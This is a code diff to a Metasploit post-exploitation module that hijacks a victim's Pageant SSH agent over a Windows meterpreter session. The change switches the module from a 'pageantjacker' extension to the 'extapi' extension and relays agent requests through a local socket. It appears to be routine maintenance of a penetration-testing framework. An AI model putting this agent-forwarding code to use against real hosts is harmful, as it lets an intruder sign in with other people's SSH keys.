@@ -38,24 +38,25 @@ class Metasploit3 < Msf::Post
       ], self.class)
   end
 
+  def setup
+    unless session.extapi
+      vprint_status("Loading extapi extension...")
+      begin
+        session.core.use("extapi")
+      rescue Errno::ENOENT
+        print_error("This module is only available in a windows meterpreter session.")
+        return
+      end
+    end
+  end
+
+
   def run
     # Check to ensure that UNIX sockets are supported
     begin
       ::UNIXServer
     rescue NameError
       print_error("This module is only supported on a Metasploit installation that supports UNIX sockets.")
-      return false
-    end
-
-    # Attempt to load the pageantjacker extension if it isn't already loaded.
-    unless session.pageantjacker
-      print_status("Loading PageantJacker extension on session #{session.sid} (#{session.session_host})")
-      session.core.use("pageantjacker")
-    end
-
-    # Fail if it cannot be loaded
-    unless session.pageantjacker
-      print_error("Failed to load PageantJacker on session #{session.sid} (#{session.session_host})")
       return false
     end
 
@@ -84,7 +85,7 @@ class Metasploit3 < Msf::Post
           socket_request_data = s.recvfrom(8192) # 8192 = AGENT_MAX
           break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
           vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
-          response = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
+          response = session.extapi.pageant.forward(socket_request_data.first, socket_request_data.first.size)
           if response[:success]
             begin
               s.send response[:blob], 0
